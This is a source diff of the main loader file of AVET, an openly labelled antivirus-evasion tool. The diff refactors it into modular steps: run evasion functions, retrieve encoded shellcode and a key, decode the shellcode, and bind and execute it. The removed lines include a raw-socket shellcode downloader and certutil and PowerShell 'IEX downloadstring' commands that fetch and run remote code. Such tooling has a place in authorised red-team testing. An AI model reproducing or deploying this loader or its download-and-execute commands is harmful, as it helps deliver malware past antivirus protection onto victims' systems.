@@ -26,249 +26,119 @@ Web: https://github.com/govolution/avet
 //     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
 //         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"
 
-#include "defs.h"
+
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-#include <tchar.h>
-#ifdef DOWNLOADEXECSC
-	#include "WinSock2.h"
-	#include "Ws2tcpip.h"
-#endif
-#include <windows.h>
+
+// Include static data (imported C arrays)
+// Defines for static retrieval are set in this file
+#include "static_data/static_data.include"
+
+// Include debug_print macro, if set.
+#include "debug_print/debug_print.include"
+#include "implementations/debug_print/debug_print.h"
+
+// Include implementation files needed for the selected functions.
+// The included files are assembled by the build script, in which functions are selected.
+#include "evasion/evasion.include"
+#include "get_shellcode/get_shellcode.include"
+#include "get_key/get_key.include"
+#include "decode_shellcode/decode_shellcode.include"
+#include "shellcode_binder/shellcode_binder.include"
 
 
-// Include shellcode binding technique to be used here
-#include "shellcode_binding.h"
+// Set how many evasion functions can be used at maximum
+#define EVASION_ARRAY_SIZE 10
 
-// Include shellcode retrieval method to be used here
-#include "get_shellcode.h"
-
-
-unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
-#ifdef DOWNLOADEXECSC
-unsigned char* downloadshellcode(char* uri);
-#endif
 
 int main (int argc, char **argv)
 {		
-	char *uvalue = NULL;	
-
-	int index;
-	int c;
-
-	opterr = 0;	
+	// Function prototype pointers to store selected functions.	
+	unsigned char *(*get_shellcode) (char *arg1, int *shellcode_size) = NULL;
+	unsigned char *(*get_key) (char *arg1, int *key_length) = NULL;
+	void (*decode_shellcode) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext) = NULL;
+	void (*shellcode_binder) (unsigned char *shellcode) = NULL;
+	
+	// Define array to store multiple evasion functions.
+	// Set static array size of 10 because dynamic size handling in cooperation with build scripts would be too messy.
+	// The included evasion.assign file will take care of populating the array.
+	typedef void (*evasion_function) (char *arg1);
+	evasion_function evasion_functions[EVASION_ARRAY_SIZE]; 
+	// NULL the array to make later checks succeed
+	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
+		evasion_functions[i] = NULL;
+	}
 		
-	// Include evasion techniques to be used here
-	#include "techniques.h"	
+	// Assign selected functions to prototypes
+	// Included assignment code is assembled by the build script
+	#include "evasion/evasion.assign"
+	#include "get_shellcode/get_shellcode.assign"
+	#include "get_key/get_key.assign"
+	#include "decode_shellcode/decode_shellcode.assign"
+	#include "shellcode_binder/shellcode_binder.assign"
+			
+	// Execute evasion functions
+	if(evasion_functions[0] == NULL) {
+		DEBUG_PRINT("No evasion techniques applied.\n");
+	}	
 	
-	// Retrieve shellcode	
-	unsigned char *shellcode = get_shellcode(argv[1]);	
+	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
+		if(evasion_functions[i] != NULL) {	
+			DEBUG_PRINT("Executing evasion function %d.\n", i);
+			evasion_functions[i]("");
+		}
+	}	
 	
-	// Bind and execute shellcode here
-	// buf is defined in defs.h by make_avet and contains the shellcode	
-	bind_shellcode(shellcode);
-	
-
-//#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
-//download a file and write to disk
-#ifdef DOWNLOADCERTUTIL
-	char download[500];  //how not to do it...
-	sprintf(download,"certutil.exe -urlcache -split -f %s",argv[2]);
-	#ifdef PRINT_DEBUG
-		printf("url: %s\n", download);
+	// Retrieve encoded shellcode
+	int shellcode_size = 0;
+	// If shellcode is retrieved statically, set the argument acoordingly to ensure that the correct data is delivered
+	#ifdef STATIC_SHELLCODE	
+	unsigned char *encoded_shellcode = get_shellcode("static_shellcode", &shellcode_size);
+	#else
+	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);
 	#endif
-	system(download);
-	#ifdef PRINT_DEBUG
-		printf("download done\n");
-	#endif
-#endif
-
-#ifdef DOWNLOADPOWERSHELL
-	char download[500];
-	sprintf(download,"powershell.exe \"IEX ((new-object net.webclient).downloadstring('%s'))\"",argv[2]);
-	#ifdef PRINT_DEBUG
-		printf("url: %s\n", download);
-	#endif
-	system(download);
-#endif		
-
-#ifdef UVALUE
-	int size = strlen(UVALUE);
-	uvalue=(char*)malloc(size);
-	strcpy(uvalue,UVALUE);
-#endif
-
-/*
-	// exec shellcode from a given file or from defs.h
-	if (fvalue)
-	{
-		unsigned char *buffer;
-		unsigned char *shellcode;
-		int size;
-//#ifndef FVALUE
-#ifdef LVALUE
-	#ifdef PRINT_DEBUG
-		printf("exec shellcode from file\n");
-	#endif
-		size = get_filesize(fvalue);
-		buffer = load_textfile(fvalue, buffer, size);
-#endif
-	#ifdef ENCRYPT 
-		#ifdef PRINT_DEBUG
-		printf ("size %d\n",size);
-		//printf ("%s\n",FVALUE);
-		printf("exec shellcode with decode_shellcode\n");
-		#endif
-		shellcode = decode_shellcode(buffer,shellcode,size);
-	#endif
-
-	#ifndef ENCRYPT
-		#ifdef LVALUE
-		unsigned char *buf = buffer; //that does the trick, although not nice. Needed for raw sc execution with -l
-		#endif
-	#ifndef ASCIIMSF 
-	#ifndef DOWNLOADEXECSC
-		#ifdef PRINT_DEBUG
-		printf("exec shellcode without decode_shellcode\n");
-		#endif
-		shellcode = buf;
-	#endif
-	#endif
-	#endif
+	if(encoded_shellcode != NULL) {
+		DEBUG_PRINT("Retrieved shellcode data, size is %d bytes.\n", shellcode_size);
+		for(int i = 0; i < shellcode_size; i++) {
+			DEBUG_PRINT("%02x ", encoded_shellcode[i]);
+		}
+		DEBUG_PRINT("\n\n");
+	} else {
+		DEBUG_PRINT("No shellcode retrieved.\n");
 	}
 	
-*/
-	
-	
-	
-	// exec from url
-/*#ifdef UVALUE
-	else if (uvalue)
-	{
-		#ifdef PRINT_DEBUG
-			printf("exec shellcode from url\n");
-		#endif
-
-		char *sh_filename;
-		sh_filename = ie_download(uvalue, sh_filename);
-		int x=strlen(sh_filename);
-		
-#ifdef PRINT_DEBUG	
-		printf("\n\n%d\n\n", x);
-#endif
-
-		unsigned char *buffer;
-		unsigned char *shellcode;
-
-		int size = get_filesize(sh_filename);
-		buffer = load_textfile(sh_filename, buffer, size);
-#ifdef ENCRYPT
-		shellcode = decode_shellcode(buffer,shellcode,size);
-#else
-		shellcode = buf;
-#endif
+	// Retrieve crypto key
+	int key_length = 0;
+	// If key is retrieved statically, set the argument accordingly to ensure that the correct data is delivered
+	#ifdef STATIC_KEY
+	unsigned char *key = get_key("static_key", &key_length);
+	#else
+	unsigned char *key = get_key(argv[2], &key_length);
+	#endif
+	if(key != NULL) {
+		DEBUG_PRINT("Retrieved key data, key length is %d bytes.\n", key_length);
+		for(int i = 0; i < key_length; i++) {
+			DEBUG_PRINT("%02x ", key[i]);
+		}
+		DEBUG_PRINT("\n\n");
+	} else {
+		DEBUG_PRINT("No key retrieved.\n");
 	}
-#endif
-*/
-
-#ifdef DOWNLOADEXECSC
-	unsigned char *shellcode = downloadshellcode(argv[1]);
-#endif
-
+		
+	// Decode shellcode
+	unsigned char* shellcode = (unsigned char *) malloc(shellcode_size);
+	DEBUG_PRINT("Calling decode_shellcode...\n");
+	decode_shellcode(encoded_shellcode, shellcode_size, key, key_length, shellcode);
+	DEBUG_PRINT("Decoded shellcode: \n");	
+	for(int i = 0; i < shellcode_size; i++) {
+		DEBUG_PRINT("%02x ", shellcode[i]);
+	}
+	DEBUG_PRINT("\n\n");
+	
+	// Bind and execute shellcode
+	DEBUG_PRINT("Calling shellcode_binder...\n");
+	shellcode_binder(shellcode);
+	
+	DEBUG_PRINT("Execution finished.\n");
 	return 0;
-}
-
-#ifdef DOWNLOADEXECSC
-//host=argv[1]
-unsigned char* downloadshellcode(char* uri)
-{
-	struct WSAData* wd = (struct WSAData*)malloc(sizeof(struct WSAData));
-	if (WSAStartup(MAKEWORD(2, 0), wd))
-		exit(1);
-	free(wd);
-	SOCKET sock;
-	
-	char c;
-	int i, j;
-	char* file;
-	char* host = uri;
-	struct addrinfo* ai;
-	struct addrinfo hints;
-	char buf[512];
-
-	//if (argc == 3) file = argv[2]; else 
-	file = strrchr(uri, '/') + 1;
-	if (strstr(uri, "http://") == uri) host += 7;
-	memset(&hints, 0, sizeof(struct addrinfo));
-	hints.ai_family = AF_UNSPEC;
-	hints.ai_socktype = SOCK_STREAM;
-	hints.ai_protocol = IPPROTO_TCP;
-	sprintf(buf, "GET %s HTTP/1.1\r\n", uri);
-	*strchr(host, '/') = '\0';
-	if (i = getaddrinfo(host, "80", &hints, &ai)) exit(1); 
-	sprintf(buf + strlen(buf), "Host: %s\r\n\r\n", host);
-	sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
-	if (connect(sock, ai->ai_addr, ai->ai_addrlen))
-		exit(1);
-	freeaddrinfo(ai);
-	i = send(sock, buf, strlen(buf), 0);
-	if (i < strlen(buf) || i == -1) exit(1);
-	while (strcmp(buf, "\r\n")) {
-		for (i = 0; strcmp(buf + i - 2, "\r\n"); i++) { recv(sock, buf + i, 1, 0); buf[i + 1] = '\0'; }
-		if (strstr(buf, "HTTP/") == buf) {
-			if (strcmp(strchr(buf, ' ') + 1, "200 OK\r\n")) exit(1);
-		}
-		if (strstr(buf, "Content-Length:") == buf) {
-			*strchr(buf, '\r') = '\0';
-			j = atoi(strchr(buf, ' ') + 1);
-		}
-	}
-
-	unsigned char *sc=(char*)malloc(j * sizeof(char));
-	for (i = 0; i < j; i++) 
-	{ 
-		recv(sock, &c, 1, 0); 
-		sc[i]=c;
-		//printf("%c",c);
-	}
-
-	closesocket(sock);
-	WSACleanup();
-
-	return sc;	
-}
-#endif
-
-// return pointer to shellcode
-unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
-{
-	int j=0;
-	shellcode=malloc((size/2));
-
-	#ifdef PRINT_DEBUG
-		printf("decode_shellcode, size for malloc: %d\nShellcode output:\n",size/2);
-	#endif
-
-	int i=0;
-	do
-	{
-		unsigned char temp[3]={0};
-		sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
-		shellcode[j] = strtoul(temp, NULL, 16);
-
-		#ifdef PRINT_DEBUG
-			printf("%x",shellcode[j]);
-		#endif
-
-		i+=2;
-		j++;
-	} while(i<size);
-
-	#ifdef PRINT_DEBUG
-		printf("\n ");
-	#endif
-
-	return shellcode;
 }
